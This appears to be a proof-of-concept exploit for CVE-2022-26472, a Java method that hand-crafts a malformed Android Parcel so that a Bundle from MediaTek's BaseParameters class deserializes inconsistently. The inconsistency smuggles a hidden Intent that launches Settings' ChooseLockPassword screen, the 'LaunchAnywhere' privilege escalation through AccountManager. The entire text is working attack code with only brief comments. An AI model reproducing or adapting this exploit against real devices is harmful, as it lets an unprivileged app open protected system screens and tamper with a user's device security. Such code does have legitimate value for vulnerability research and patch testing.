//poc for CVE-2022-26472
//LaunchAnywhere through Android AccounManager

`
   //mediatek-framework.jar com.mediatek.mmsdk.BaseParameters
   
   public Bundle bundleTest(){
        Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        // Manipulate the raw data of bundle Parcel
        // Now we replace this right Parcel data to evil Parcel data
        pcelData.writeInt(2); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("com.mediatek.mmsdk.BaseParameters"); // name of Class Loader
        pcelData.writeInt(3);

        //read int from string, eat bytearray key,type,len, then intent show
        pcelData.writeInt(5);
        pcelData.writeInt(11);
        pcelData.writeInt(3997793);
        pcelData.writeInt(98);
        pcelData.writeInt(1);
        //key 2
        pcelData.writeInt(99);
        pcelData.writeInt(13);
        pcelData.writeInt(396);
        int lenPos = pcelData.dataPosition();

//        pcelData.writeString("c");//key
//        pcelData.writeInt(13);//bytearray
//        pcelData.writeInt(396);

        pcelData.writeString("intent");
        pcelData.writeInt(4);// VAL_PACELABLE
        pcelData.writeString("android.content.Intent");// name of Class Loader
        //pcelData.writeString(Intent.ACTION_RUN); // Intent Action  string8
        writeString8(pcelData, Intent.ACTION_RUN);
        Uri.writeToParcel(pcelData, null); // Uri is null
        //pcelData.writeString(null); // mType is null string8
        writeString8(pcelData, null);
        //pcelData.writeString(null); // mIdentifier is null string8
        writeString8(pcelData, null);
        pcelData.writeInt(0x10000000); // Flags
        //pcelData.writeString(null); // mPackage is null string8
        writeString8(pcelData, null);
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
//        pcelData.writeString("com.google.android.packageinstaller");
//        pcelData.writeString("com.android.packageinstaller.television.UninstallAppProgress");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);
        ///////////////////////////////////////

        int length  = pcelData.dataSize();
        pcelData.setDataPosition(lenPos-4);
        pcelData.writeInt(length - lenPos);
        pcelData.setDataPosition(0);

        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());

        //unmarshall
//        evilBundle.setClassLoader(this.getClass().getClassLoader());
        Intent rawi = evilBundle.getParcelable("intent");

        //marshall
        Parcel p = Parcel.obtain();
        p.writeBundle(evilBundle);
        p.setDataPosition(0);

        //unmarshall
        Bundle pp = p.readBundle();
//        pp.setClassLoader(this.getClass().getClassLoader());
        Intent i = pp.getParcelable("intent");
        int a = pp.getInt("a");

        return evilBundle;
    }
    
`
